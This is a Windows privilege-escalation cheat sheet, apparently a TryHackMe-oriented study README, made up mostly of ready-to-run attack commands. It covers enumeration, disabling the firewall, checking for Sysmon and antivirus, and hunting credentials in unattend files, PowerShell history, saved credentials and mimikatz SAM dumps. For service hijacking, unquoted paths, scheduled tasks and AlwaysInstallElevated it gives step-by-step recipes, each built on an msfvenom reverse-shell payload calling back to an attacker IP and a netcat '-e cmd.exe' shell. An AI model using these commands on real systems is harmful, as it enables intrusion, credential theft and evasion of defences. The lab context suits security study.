# Winprivesc-Tricks-Learn✅📚
[lpeworkshop-Workshop](https://github.com/sagishahar/lpeworkshop)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[hacktricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=Windows-Privilege#windows-local-privilege-escalation)

[winprivesc](https://tryhackme.com/room/winprivesc)

[windowsprivesc20](https://tryhackme.com/room/windowsprivesc20)

[windows10privesc](https://tryhackme.com/room/windows10privesc)

[windows10privesc](https://tryhackme.com/room/windows10privescgn)

[windowsprivescarena](https://tryhackme.com/room/windowsprivescarena)

# Tools 🛠
[winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

[Seatbelt](https://github.com/GhostPack/Seatbelt)

[mimikatz](https://github.com/gentilkiwi/mimikatz)

[nc.exe](https://github.com/int0x33/nc.exe)

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

## Basic-Enumeration ✅
```powershell
hostname
systeminfo        # System and Windows Information Like Hotfix(s)
wmic os get Caption, Version, OSArchitecture # اطلاعات سیستم و ویندوز
driverquery # Check the drivers
--------------------------------------------------------------------------
# Sharing files and Printers Enumeration
net share
net view \\TARGET-IP 
net use Z: \\TARGET-IP\SharedFolder
--------------------------------------------------------------------------
# User-Enumeration
whoami 
whoami /priv      # بررسی سطح دسترسی
whoami /groups
qwinsta # View users who are login at the same time
query session # View users who are login at the same time
--------------------------------------------------------------------------
# Check password policy,  minimum password length, maximum password age, and lockout duration.
net accounts # Check the system settings  
net accounts /domain # Checking the system settings belongs to a domain
--------------------------------------------------------------------------
net user # List of system usernames
net user Administrator # Check the details of a particular user
net group # List of system Windows Domain Controller group
net localgroup # List of system local system group
net localgroup administrators  #  list the users that belong to the local administrators group
Get-ADUser -Filter * # Find users in Active Directory
Get-ADUser -Filter * -SearchBase "DC=THMREDTEAM,DC=COM" # Find all users in a particular DC (Domain Component)
Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM" # Search users in a particular CN (Common Name)
Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM" # Find all users in a particular OU (Organizational Unit)
--------------------------------------------------------------------------
# Network-Enumeration
arp -a     # برسی جدول آرپ برای شناسایی دستگاه‌های دیگری که در شبکه فعال هستند
ipconfig /all     # بررسی اطلاعات شبکه
netstat -anot      # بررسی پورت‌های باز و اتصالات شبکه
netstat -ano | findstr :3366  # بررسی باز بودن یا نبودن یک پورت خاص 
dig -t AXFR redteam.thm @10.10.73.142
dig -t CNAME redteam.thm @10.10.73.142
dig -t DNSSEC redteam.thm @10.10.73.142

# Check DNS service (to analyze domain name on the network) 
> nslookup.exe # run tool
> server <IP-Dns-Server> # Set dns server
> ls -d thmredteam.com # Check Zone Transfer (if the server is not configured correctly, the domain information can be extracted)
--------------------------------------------------------------------------
# These tools are for gathering information and abusing common mistakes in Windows security configurations.
https://github.com/GhostPack/Seatbelt
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
https://github.com/PowerShellMafia/PowerSploit
```

## Host-Security-Enumeration ✅
```powershell
# Antivirus
sc query windefend
wmic /namespace:\\root\securitycenter2 path antivirusproduct # Antivirus Identification Method
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct # Antivirus Identification Method
Get-Service WinDefend # Check Windows Defender's status
Get-MpComputerStatus | select RealTimeProtectionEnabled # Check Windows Defender's (Real-time Protection) status
Get-MpThreat # View threats identified by Microsoft Defender
--------------------------------------------------------------------------
# Firewall
Get-NetFirewallProfile | Format-Table Name, Enabled # Checking the Firewall Status 
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False # If we have admin access, we can disable the firewall on profiles
Get-NetFirewallRule | select DisplayName, Enabled, Description # Checking the firewall rules
Get-NetFirewallRule | select DisplayName, Enabled, Description # Check of specific firewall rules

netsh firewall show state # Checking the Firewall Status
netsh advfirewall firewall show rule name=all # Checking the firewall rules
netsh advfirewall set allprofiles state off # Disable firewall in all profiles
netsh advfirewall firewall show rule name=all | findstr /i "3366" # Checking a particular port in the firewall rules

(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "445")).Connected # Check whether a particular port is open in firewall rules or not
Test-NetConnection -ComputerName 127.0.0.1 -Port 445  # Check whether a particular port is open in firewall rules or not
$portRange = 80..90; $portRange | ForEach-Object { Test-NetConnection -ComputerName 127.0.0.1 -Port $_ } # Check whether a particular range ports are open in firewall rules or not
--------------------------------------------------------------------------
# Log
Get-EventLog -List # Check the list of logs in the system
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }  # Checking SysMon Installation on System
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"  # Checking SysMon Installation on System
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational  # Checking SysMon Installation on System
----------------------------------------------------------------
# If the hacker can access the Sysmon configuration file, he can find out what activities are being monitored and trying to erase his rejection!
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\* 
----------------------------------------------------------------
wmic qfe get Caption,Description,HotFixID,InstalledOn # Checking the system update level and Check installed security patch
----------------------------------------------------------------
# Check what are security software such as antivirus, EDR, or monitoring runs on the system with External tools
https://github.com/PwnDexter/Invoke-EDRChecker
https://github.com/PwnDexter/SharpEDRChecker
```
# Abusing Applications/Services Misconfigurations ✅
## Windows-Applications/Services-Enumeration ✅
```powershell
net start # List of active services in the system
wmic service where "name like 'THM Demo'" get Name,PathName #  Find the path of the specific service executable file
Get-Process -Name thm-demo # Checking Process activities associated with this service
# Note: Process ID (PID) This is useful for the next steps.

wmic product get name,version,vendor # Checking the list of all installed software with their version
wmic service get name,displayname,pathname,startmode # Check (name, display name, executable file path and how to start) a list of all the services in the system 

tasklist  # List of active processing
tasklist | findstr <PID> # List of uniq active processing
wmic process list full  # View all the details of the processing

sc queryex type=service # List of all running services
sc qc <service name> # Check the configuration details

icacls WService.exe # Check Permission Service File exe
accesschk64.exe -qlc thmservice 

Get-SmbServerConfiguration # Check the SMB version running on a Windows system (in the internal network)
----------------------------------------------------------------
# Check services through the Windows Registry

reg query HKLM\SYSTEM\CurrentControlSet\Services\ # List of all running services 
reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s # List of all service and config 
reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s /f "ImagePath" # List of all service and ImagePath config 
reg query HKLM\SYSTEM\CurrentControlSet\Services\WindowsScheduler # Check the configuration details of a particular service

reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ # List of all service
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ /s # List of all service and config 
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ /s /f "ImagePath" # List of all service and ImagePath config  
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsScheduler # Check the configuration details of a particular service
```
## Privilege Escalation with Insecure Permissions on Service Executable ✅

> [!Note]
> If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
```powershell
1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
sc qc WindowsScheduler # cmd
sc.exe qc WindowsScheduler # powershell
2️⃣ # Check Permission Service File
icacls C:\PROGRA~2\SYSTEM~1\WService.exe 
3️⃣ # Making a malicious Payload with MSFvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4445 -f exe-service -o rev-svc.exe
4️⃣ # Transfer of malicious file to the victim system
python3 -m http.server # attackbox
wget http://10.11.99.141:8000/rev-svc.exe -O C:\Users\thm-unpriv\rev-svc.exe # target system
5️⃣ # Replace the service executable file ( before copy backup from file ):
cp C:\PROGRA~2\SYSTEM~1\WService.exe C:\PROGRA~2\SYSTEM~1\WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe C:\PROGRA~2\SYSTEM~1\WService.exe
6️⃣ # Giving all users permission for run this file
icacls C:\PROGRA~2\SYSTEM~1\WService.exe /grant Everyone:F
7️⃣ # Launch Lenner on the attackbox
nc -lvp 4445
8️⃣ # stop and start service for get access
sc stop windowsscheduler # cmd
sc start windowsscheduler # cmd
sc.exe stop windowsscheduler # powershell
sc.exe start windowsscheduler # powershell
```
## Privilege Escalation with Unquoted Service Paths ✅

> [!Note]
> When a Windows service is set to use a specific executable file (") it must be inside the ("), especially if the route contains the space. If these quotes are not there, Windows When running the service, it cannot determine where the executable file is and may first look for other files that are on the way.
```powershell
1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
sc qc WindowsScheduler # cmd
sc.exe qc WindowsScheduler # powershell
2️⃣ # Checking access level on vulnerable path
icacls C:\MyPrograms
3️⃣ # Making a malicious Payload with MSFvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4446 -f exe-service -o rev-svc2.exe
4️⃣ # Transfer of malicious file to the victim system
python3 -m http.server # attackbox
wget http://10.11.99.141:8000/rev-svc2.exe -O C:\Users\thm-unpriv\rev-svc2.exe # target system
5️⃣ # Insert malicious file
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
6️⃣ # Giving all users permission for run this file
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
7️⃣ # Launch Lenner on the attackbox
nc -lvp 4446
8️⃣ # stop and start service for get access
sc stop "disk sorter enterprise" # cmd
sc start "disk sorter enterprise" # cmd
sc.exe stop "disk sorter enterprise" # powershell
sc.exe start "disk sorter enterprise" # powershell
```
## Privilege Escalation with Insecure Service Permissions ✅

> [!Note]
> Another way to upgrade access to Windows is to check the level of access to services. If DACL (Discretionary Access Control List) a service allows ordinary users to change the service configuration, this vulnerability can be used to execute the desired code with high access level.
> [!Note]
> We must first check if a particular service is allowed permission to change by normal users. To do this, we use the [Accessch](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool using the Sysinternals set. ( BUILTIN\Users : SERVICE_ALL_ACCESS )
```powershell
1️⃣ # Check the permission service with accesschk Tools
accesschk64.exe -qlc thmservice
# output [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
# This allows us to change the executive path of the service and to execute a destructive proliferation instead.
2️⃣ # Making a malicious Payload with MSFvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4447 -f exe-service -o rev-svc3.exe
3️⃣ # Transfer of malicious file to the victim system
python3 -m http.server # attackbox
wget http://10.11.99.141:8000/rev-svc3.exe -O C:\Users\thm-unpriv\rev-svc3.exe # target system
4️⃣ # Giving all users permission for run this file
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
5️⃣ # Change the executive path of the service to the malicious file path
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem # cmd
sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem # powershell
6️⃣ # Launch Lenner on the attackbox
nc -lvp 4447
7️⃣ # stop and start service for get access
sc stop "THMService" # cmd
sc start "THMService" # cmd
sc.exe stop "THMService" # powershell
sc.exe start "THMService" # powershell
```

## Credentials ✅
## File-Unattended ✅
```powershell
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
```powershell
dir C:\sysprep.inf /s /p
dir C:\sysprep.xml /s /p
dir C:\unattend.xml /s /p
dir C:\Users\*\.ssh\ # Check SSH keys

findstr /si password *.txt
type C:\Users\Administrator\Desktop\passwords.txt
Get-ChildItem -Hidden -Path C:\Users\Public\  # List of hidden files

Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\Panther\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\system32\sysprep\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Hidden -Path C:\Users -Recurse -Force | Select-String -Pattern "password|passwd|credentials|login" # Password hunting and sensitive information
```
## Powershell History ✅

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in cmd
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in powershell
```
## Saved Windows Credentials ✅
```powershell
cmdkey /list # show save user credentials
runas /savecred /user:<username> cmd.exe # run cmd with another user 
runas /savecred /user:<username> powershell.exe # run powershell with another user
```
## IIS Configuration ✅
```powershell
type C:\inetpub\wwwroot\web.config | findstr connectionString
forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
## Retrieve Credentials from Software: PuTTY ✅
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## Scheduled Tasks ✅
```powershell
1️⃣ # Check and find vuln task on target system
schtasks # List recipe all scheduled tasks
schtasks /query /fo LIST /v # list of all the scheduled tasks in the system, along with the full details of each task
schtasks /query /tn vulntask /fo list /v  # Receive complete information about a particular task (eg Vulntask)
2️⃣ # Check Permission File
icacls c:\tasks\schtask.bat  
3️⃣ # Add a Reverse Shell in the executable file
echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat  
4️⃣ # Launch Lenner on the Hacker System
nc -lvnp 4444 
5️⃣ # run the vuln task
schtasks /run /tn vulntask 
```
## AlwaysInstallElevated ✅

> [!Note]
> "AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.
```powershell
1️⃣ # Check the value of Alwaysinstallelelevated in Windows Registry setting if both keys is 1, the system is vulnerable.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 
2️⃣ # Making a malicious Payload with MSFvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi 
4️⃣ # Transfer of malicious file to the victim system
python3 -m http.server # attackbox
wget http://10.11.99.141:8000/malicious.msi -O C:\Windows\Temp\malicious.msi # target system
5️⃣ # Giving all users permission for run this file
icacls C:\Windows\Temp\malicious.msi /grant Everyone:F
6️⃣ # Launch Lenner on the attackbox
nc -lvp 4444
7️⃣ # execute malicious file (malicious.msi) for get access
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi 
```

## Strart-Powershell-With-Admin ✅
```powershell
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```

## Mimikatz-Command ✅
```powershell
privilege::debug # this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
token::elevate # simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges
lsadump::sam # list of password
```
